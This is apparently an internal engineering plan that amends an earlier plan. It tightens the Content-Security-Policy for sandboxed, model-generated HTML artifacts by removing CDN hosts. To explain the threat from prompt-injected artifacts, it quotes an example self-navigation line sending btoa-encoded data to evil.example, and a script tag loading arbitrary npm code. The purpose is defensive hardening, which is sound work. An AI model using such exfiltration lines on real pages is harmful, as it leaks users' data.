# Plan 070: Artifact CSP — close the CDN script exfiltration channel (amendment to 050)

> **Executor instructions**: This is an amendment plan in the 061 mold — its
> deliverable is the amendment block below appended verbatim to
> `docs/plans/050-artifacts-model-serving.md`, plus the reconciled README
> rows. No code. The code lands through the amended 050. When done, update
> the status row in `docs/plans/000_README.md`.
>
> **Drift check (run first)**:
> `git diff --stat c770a1c..HEAD -- docs/plans/050-artifacts-model-serving.md`
> and `grep -ri artifact apps/api --include="*.py"` (must match nothing) and
> the 050 row in `docs/plans/000_README.md` (must read TODO). If 050 has
> already executed — artifact code exists or its row is not TODO — STOP:
> this becomes a code change to `services/artifacts/domain.py` and its
> tests, and needs replanning against the landed CSP builder.

## Status

- **Priority**: P1
- **Effort**: S
- **Risk**: LOW as a doc — closes a scripted-exfiltration channel before
  any artifact code exists; the code delta inside 050 is a shorter CSP
  string and two tests
- **Depends on**: 050 (written, TODO). **Binds before 050 executes** — the
  amendment must be in 050's text when its executor reads it
- **Category**: Lane B — best-practice amendments (067–074, added
  2026-07-07)
- **Planned at**: working tree at commit `c770a1c`, 2026-07-07

## Decisions taken

1. **050 decision 7 is superseded: v1 ships no external hosts in the
   artifact CSP.** `cdn.jsdelivr.net` and `unpkg.com` are general-purpose
   npm mirrors — they serve *every published npm package* under
   attacker-choosable paths (`/npm/<any-package>@<any-version>/<file>`).
   Whitelisting them in `script-src` hands arbitrary attacker-published
   code to any prompt-injected artifact in one tag:
   `<script src="https://cdn.jsdelivr.net/npm/anything">`. This directly
   violates 050's own maintenance-note review rule ("Reviewers should
   reject any host that serves user-controllable paths (that would reopen
   exfil via `script-src`)") — the v1 whitelist fails the v1 review rule.
   `ARTIFACT_CSP_CDN_HOSTS` becomes the empty tuple; the constant stays as
   the seam for decision 4.
2. **050's "cannot phone home" claim is corrected, not just the
   whitelist.** `connect-src 'none'` blocks fetch/XHR/WebSockets/beacons,
   and 050's `sandbox allow-scripts` (no `allow-top-navigation`, no
   `allow-popups`) blocks top-frame navigation and popups — but nothing
   blocks a frame from navigating *itself*:
   `location.href = "https://evil.example/?d=" + btoa(data)` exfiltrates
   through the navigation request URL. CSP `navigate-to` never shipped in
   any browser; no directive or sandbox flag closes this while scripts
   run. The channel is destructive and visible (the frame leaves the
   artifact), but it works once — which is exactly why script provenance,
   not `connect-src`, is the load-bearing control, and why a
   whole-npm-registry `script-src` is untenable.
3. **Rejected: SRI / exact-URL pinning (option b).** Requiring
   `integrity` attributes is unenforceable — the artifact HTML is
   attacker-authored and simply omits them; `require-sri-for` was never
   standardized or shipped. URL-path-level pinning in the CSP source list
   (`https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.js`) does
   bind, but is brittle (a trailing slash silently becomes a prefix
   whitelist), keeps a third-party availability dependency in a security
   header, and still needs decision 4's per-library review with none of
   its origin control. Not worth carrying as the v1 mechanism.
4. **Named follow-up seam: self-hosted vetted bundles (option a).** If
   evidence shows models' HTML artifacts genuinely need Chart.js or a
   Tailwind build, the path is a static `/artifacts/vendor/` route on the
   artifact origin serving a small set of pinned, vetted, checked-in
   bundles, whitelisted by path-scoped CSP source — Praxis controls every
   byte, and `nosniff` (already on all serving responses) prevents
   artifact HTML being replayed as a script. Deferred, not designed here;
   the demand is weaker than 050 assumed anyway — mermaid and csv are
   dedicated artifact types served as `text/plain` and rendered by 051's
   own UI, not by in-artifact CDN scripts.
5. **Self-contained artifacts are the v1 contract (option c).** HTML
   artifacts run inline script/style only (`'unsafe-inline'` stays —
   models emit inline code and the sandbox is the boundary, not inline
   bans); assets embed as `data:`/`blob:`. This matches the strictest
   production artifact sandboxes. Residual risk, stated honestly: a
   prompt-injected *inline* script can still navigation-exfiltrate
   content the model itself baked into the artifact. The CSP cannot close
   that; what this amendment closes is the amplifier — arbitrary
   third-party code executing in the frame.
6. **The tightened claim is pinned by tests** (test plan amendment below):
   the CSP byte-match string loses the CDN hosts, and a structural test
   asserts no scheme-and-host source appears in `script-src`, `style-src`,
   `font-src`, `img-src`, or `connect-src` (only keyword/`data:`/`blob:`
   tokens — `frame-ancestors` is the one directive allowed to carry
   origins), with `cdn.jsdelivr.net` and `unpkg.com` asserted absent by
   name so a revert is loud.

## Why this matters

050's security posture is its actual deliverable — "the three-layer
defense is the point of this plan, not an add-on" — and one line of its
CSP undoes layer three. Decision 7 reads "exactly two hosts —
`https://cdn.jsdelivr.net` and `https://unpkg.com` — for
`script-src`/`style-src`/`font-src`" and calls `connect-src 'none'`
"non-negotiable: a prompt-injected artifact cannot phone home", while its
own maintenance note states the rule that both hosts break. Fixing this
now, while zero artifact code exists, is a text edit; fixing it after 050
lands is a CSP migration against shipped artifacts that may already lean
on CDN tags.

## Current state

All anchors verified on the working tree at `c770a1c` (2026-07-07):

- `docs/plans/050-artifacts-model-serving.md` is written, status TODO in
  `docs/plans/000_README.md`. Decision 7 whitelists the two CDN hosts and
  homes them in `ARTIFACT_CSP_CDN_HOSTS` (`services/artifacts/domain.py`,
  unbuilt); decision 8 sets the CSP `sandbox allow-scripts` directive;
  Step 5's HTML header block carries both hosts in
  `script-src`/`style-src`/`font-src`; Step 7 pins the CSP byte-for-byte;
  the maintenance note carries the user-controllable-paths review rule
  quoted in decision 1 above.
- Nothing artifact-shaped exists in code
  (`grep -ri artifact apps/api --include="*.py"` matches nothing).
- Plan 051 consumes 050's serving pipeline verbatim (its share route
  serves the same headers), so this amendment hardens 051 for free.

## Scope

**In scope:**

- `docs/plans/050-artifacts-model-serving.md` — append the amendment
  block below, verbatim, as the final section
- `docs/plans/000_README.md` — add the 070 row; append "amended by 070"
  to the 050 row's dependency cell

**Out of scope:**

- Any code — the CSP builder, constant, and tests land inside 050's
  execution per the amendment.
- Plan 051's text (it inherits the amended headers through 050's
  "reused verbatim" maintenance note; no separate edit needed).
- The `/artifacts/vendor/` follow-up (decision 4) — a future plan, not a
  reserved number.

## Git workflow

- Branch: `advisor/070-artifact-csp-cdn-hardening`
- Commit: `Docs - Artifact CSP CDN Hardening Amendment`
- Do NOT push or open a PR unless the operator instructed it.

## Steps

1. Run the drift check. Append the block below to the end of 050,
   character-for-character.
2. Update the two `000_README.md` rows (070 added, 050 annotated).

## Amendment block (append verbatim to 050)

````markdown
## Amendment (plan 070, 2026-07-07): no CDN hosts in the artifact CSP

Where this block conflicts with the text above, this block wins.

- **Decision 7 is superseded.** `cdn.jsdelivr.net` and `unpkg.com` serve
  every npm package under attacker-choosable paths, which the Maintenance
  notes' own rule ("reject any host that serves user-controllable paths")
  forbids. v1 ships **no external hosts** in the artifact CSP:
  `ARTIFACT_CSP_CDN_HOSTS = ()` (keep the constant — it is the seam for a
  future self-hosted `/artifacts/vendor/` path-scoped source; a
  general-purpose CDN host must never be added to it).
- **Decision 8 clarification / "phone home" correction.** The
  `sandbox allow-scripts` directive (no `allow-top-navigation`, no
  `allow-popups`) blocks top-frame navigation and popups, but a frame can
  always navigate itself: `location.href = "https://evil.example/?d=..."`
  exfiltrates via the navigation URL despite `connect-src 'none'`, and no
  shipped CSP directive closes it (`navigate-to` never shipped). Read
  decision 7's "cannot phone home" as "cannot *silently* phone home";
  navigation exfil by injected inline script is the accepted residual,
  which is why `script-src` admits no third-party code to amplify it.
- **Step 5 HTML header block becomes:**

  ```
  Content-Type: text/html; charset=utf-8
  Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; connect-src 'none'; frame-ancestors {app_origins}; base-uri 'none'; form-action 'none'; object-src 'none'; sandbox allow-scripts
  X-Content-Type-Options: nosniff
  Referrer-Policy: no-referrer
  Cache-Control: no-store
  ```

  Non-HTML header blocks are unchanged. HTML artifacts are self-contained:
  inline script/style only, assets as `data:`/`blob:`.
- **Step 7 / test plan additions**: the CSP byte-match uses the string
  above; add a structural test parsing the built policy and asserting
  `script-src`, `style-src`, `font-src`, `img-src`, and `connect-src`
  contain no scheme-and-host source (keyword/`data:`/`blob:` tokens only;
  `frame-ancestors` alone may carry origins), and that neither
  `cdn.jsdelivr.net` nor `unpkg.com` appears anywhere in the policy.
- **Maintenance note "CDN whitelist growth" is superseded**: external
  script sources may only ever arrive via pinned, vetted, checked-in
  bundles served from the artifact origin under `/artifacts/vendor/`
  (path-scoped CSP source) — never a third-party host. The remote
  `img-src` / `connect-src` prohibition stands unchanged.
````

## Done criteria

- [ ] `grep -c "Amendment (plan 070" docs/plans/050-artifacts-model-serving.md`
      prints `1`, and the block is the file's final section
- [ ] `grep -n "070" docs/plans/000_README.md` shows the new 070 row and
      the annotated 050 row
- [ ] `git diff --stat` touches only `docs/plans/050-artifacts-model-serving.md`,
      `docs/plans/000_README.md`, and this file — no code changed
- [ ] The 050 row in `docs/plans/000_README.md` still reads TODO (this
      plan bound in time)

## STOP conditions

- The drift check fails: 050 has begun executing, artifact code exists,
  or 050's decision 7 / Step 5 / maintenance-note text no longer matches
  the excerpts quoted here — reconcile against the live text first.
- 050's governance citation has moved (the §2 artifact approval default
  changed) in a way that reshapes the serving design — reassess whether
  the amendment still applies cleanly.

## Maintenance notes

- **050's executor** implements the amended Step 5/Step 7 directly; the
  amendment is written so no other 050 step changes.
- **051** inherits the hardened headers through the shared serving
  pipeline; its share route must not reintroduce external sources.
- The `/artifacts/vendor/` seam (decision 4) is a new plan if ever picked
  up. Until then, "no external hosts" is the whole policy.
- Reviewers of any future CSP change should re-read decision 2 here: the
  navigation channel is irreducible while scripts run, so every proposed
  `script-src` source must be held to the controls-every-byte standard.
